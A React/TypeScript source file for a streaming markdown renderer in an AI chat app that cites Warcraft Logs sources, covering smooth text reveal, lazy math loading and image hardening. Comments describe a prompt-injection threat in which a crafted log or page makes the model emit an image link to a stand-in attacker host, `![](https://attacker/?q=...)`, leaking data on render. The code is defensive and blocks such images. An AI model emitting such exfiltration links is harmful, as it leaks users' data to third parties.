import { memo, useEffect, useMemo, useState } from "react";
import { Streamdown, defaultRehypePlugins } from "streamdown";
import type { Components } from "streamdown";
import { visit } from "unist-util-visit";
import { rehypeWordSpans } from "../lib/rehypeWordSpans";
import { useSmoothText } from "../hooks/useSmoothText";

type PluginTuple = Extract<(typeof defaultRehypePlugins)[string], unknown[]>;

/**
 * US6 streaming renderer (replaces the old react-markdown `Markdown`).
 *
 * Streamdown renders streaming-safe GFM markdown (no flashing `**`/broken tables
 * mid-stream) and memoizes completed blocks. We layer on:
 *  - `useSmoothText` so text inks in at a steady adaptive rate (FR-029),
 *  - `rehypeWordSpans` for the per-word ink-in reveal (CSS-only), while streaming only,
 *  - an ember caret trailing the stream,
 *  - new-tab links (US1/FR-003) so clicking a Warcraft Logs source never loses chat state.
 */

// sc-157 (QA SEC-003): Streamdown's harden step allows every image by default, so a crafted
// log or web page could make the model emit `![](https://attacker/?q=...)` and leak data the
// moment it renders. We re-run harden with NO image allowed (allowedImagePrefixes: []); each
// one becomes a "[Image blocked: alt]" text span. sc-272: this used to allow this origin, but
// `![](/api/...pdf)` then fired an authenticated GET (a costly endpoint) as soon as it
// rendered, and the app emits no images in markdown. (`data:` images were already dropped by
// Streamdown's URL transform.) Links keep the default (any http/https), since they need a
// click.
// QA 2026-10-31b: protocols are harden's safe set plus Streamdown's own placeholder for a
// half-streamed link, so the check holds even if sanitize stops running first.
const ORIGIN = window.location.origin;
const [harden] = defaultRehypePlugins.harden as PluginTuple;
const HARDEN: PluginTuple = [
  harden,
  {
    defaultOrigin: ORIGIN,
    allowedImagePrefixes: [],
    allowedLinkPrefixes: ["*"],
    allowedProtocols: ["streamdown:"],
    blockedImageClass: "text-muted-foreground",
  },
];

// QA BUG-001: harden only checks `img src`, but sanitize keeps `<picture><source srcset>`,
// and the browser fetches a `<source>` before the `<img>`. sc-272: harden still lets an `img`
// through for the schemes it passes as-is (`blob:`, Streamdown's `streamdown:` placeholder).
// None of them can reach an app route, but "no images" is cheaper to hold than to argue, so
// after sanitize and harden drop every `<img>` and `<source>` and any `srcset`.
type HastElement = { tagName: string; properties: Record<string, unknown> };
type HastParent = { children: unknown[] };

function rehypeNoImages() {
  return (tree: unknown) => {
    visit(tree as never, "element", (node: HastElement, index?: number, parent?: HastParent) => {
      if ((node.tagName === "source" || node.tagName === "img") && parent && index !== undefined) {
        parent.children.splice(index, 1);
        return index;
      }
      delete node.properties.srcSet;
      return undefined;
    });
  };
}

// Streamdown's defaults (with our harden), plus our word-span plugin for the live reply
// (passing rehypePlugins replaces the defaults). Finished messages skip the per-word spans:
// the ink-in has already played, and a span per word is costly on long answers (PERF-010).
const STATIC_REHYPE_PLUGINS = [
  ...Object.values({ ...defaultRehypePlugins, harden: HARDEN }),
  rehypeNoImages,
];
const STREAMING_REHYPE_PLUGINS = [...STATIC_REHYPE_PLUGINS, rehypeWordSpans];

// PERF-011: KaTeX loads on demand, the first time any reply contains math (US3).
type MathPlugin = typeof import("../lib/mathPlugin").MATH_PLUGIN;
let mathPlugin: MathPlugin | null = null;
let mathLoading: Promise<MathPlugin> | null = null;
const MATH_PATTERN = /\$\$|\\\(|\\\[|\$[^\s$][^$\n]*\$/;

function useMathPlugin(text: string): MathPlugin | null {
  const needed = MATH_PATTERN.test(text);
  const [plugin, setPlugin] = useState<MathPlugin | null>(mathPlugin);
  useEffect(() => {
    if (!needed || plugin) return;
    mathLoading ??= import("../lib/mathPlugin").then((m) => (mathPlugin = m.MATH_PLUGIN));
    let live = true;
    void mathLoading.then((p) => live && setPlugin(p));
    return () => {
      live = false;
    };
  }, [needed, plugin]);
  return needed ? plugin : null;
}

const COMPONENTS: Partial<Components> = {
  a: ({ node, children, ...props }) => {
    void node;
    return (
      <a {...props} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    );
  },
};

function StreamMarkdownImpl({
  content,
  streaming = false,
}: {
  content: string;
  streaming?: boolean;
}) {
  const shown = useSmoothText(content, streaming);
  const math = useMathPlugin(shown);
  const plugins = useMemo(() => (math ? { math } : undefined), [math]);
  return (
    <div className={`markdown stream${streaming ? " is-streaming" : ""}`}>
      <Streamdown
        mode={streaming ? "streaming" : "static"}
        parseIncompleteMarkdown={streaming}
        rehypePlugins={streaming ? STREAMING_REHYPE_PLUGINS : STATIC_REHYPE_PLUGINS}
        plugins={plugins}
        components={COMPONENTS}
      >
        {shown}
      </Streamdown>
      {streaming && <span className="ember-caret" aria-hidden="true" />}
    </div>
  );
}

export const StreamMarkdown = memo(StreamMarkdownImpl);
